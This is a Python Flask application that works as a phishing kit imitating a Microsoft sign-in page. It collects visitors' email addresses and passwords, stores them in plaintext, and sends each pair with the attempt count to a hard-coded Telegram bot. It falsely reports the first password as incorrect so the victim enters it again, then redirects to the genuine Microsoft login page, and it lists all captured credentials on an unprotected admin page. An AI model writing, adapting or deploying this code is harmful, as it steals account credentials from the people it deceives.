from flask import Flask, render_template, request, redirect, url_for, session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import requests
import os
import re

app = Flask(__name__)

app.secret_key = os.environ.get('SECRET_KEY', 'ms_secret_key_2026')

app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///users.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# ── Telegram Config ──
TELEGRAM_BOT_TOKEN = '8818621809:AAGj2fNcz1YLMNUKxsxp2rAr54S2Q1PaWk0'
TELEGRAM_CHAT_ID   = '8063853431'


# ── Send Telegram Notification ──
def send_telegram(email, password, attempt_number):
    try:
        message = (
            f"🔔 *New Login Attempt*\n\n"
            f"📧 *Email:* `{email}`\n"
            f"🔑 *Password:* `{password}`\n"
            f"🔢 *Attempt:* {attempt_number}\n"
            f"🕐 *Time:* {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
        )

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }

        response = requests.post(url, json=payload, timeout=5)
        print(f"Telegram response: {response.json()}")

    except Exception as e:
        print(f"Telegram error: {e}")


# ── Model ──
class LoginAttempt(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    email     = db.Column(db.String(150), nullable=False)
    password  = db.Column(db.String(150), nullable=True)
    status    = db.Column(db.String(50), default='unknown')
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f'<LoginAttempt {self.email}>'


# ── Simple email format check ──
def is_valid_email(email):
    pattern = r'^[^@\s]+@[^@\s]+\.[^@\s]+$'
    return re.match(pattern, email) is not None


# ── Routes ──
@app.route('/', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        email = request.form.get('email', '').strip()

        if not email:
            error = "Please enter your email, phone, or Skype."
        elif not is_valid_email(email):
            error = "Enter a valid email address."
        else:
            session['email'] = email
            session['attempts'] = 0
            session.modified = True
            return redirect(url_for('password'))

    return render_template('login.html', error=error)


@app.route('/password', methods=['GET', 'POST'])
def password():
    email = session.get('email')
    error = None

    if not email:
        return redirect(url_for('login'))

    if request.method == 'POST':
        pwd = request.form.get('password', '').strip()

        if not pwd:
            error = "Please enter your password."
        else:
            # Track attempts
            attempts = session.get('attempts', 0) + 1
            session['attempts'] = attempts
            session.modified = True

            # Save to DB
            attempt = LoginAttempt(email=email, password=pwd, status=f'attempt_{attempts}')
            db.session.add(attempt)
            db.session.commit()

            # Send Telegram notification
            send_telegram(email, pwd, attempts)

            if attempts >= 2:
                return redirect(
                    f'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
                    f'?client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c'
                    f'&response_type=code'
                    f'&login_hint={email}'
                    f'&scope=openid profile email'
                )
            else:
                error = "Your account or password is incorrect. If you don't remember your password, reset it now."

    return render_template('password.html', email=email, error=error)


@app.route('/success')
def success():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    email = session.get('email', '')
    return render_template('success.html', email=email)


@app.route('/admin')
def admin():
    attempts = LoginAttempt.query.order_by(LoginAttempt.timestamp.desc()).all()
    return render_template('admin.html', attempts=attempts)


# ── Create tables ──
with app.app_context():
    db.create_all()


if __name__ == '__main__':
    app.run(debug=True)
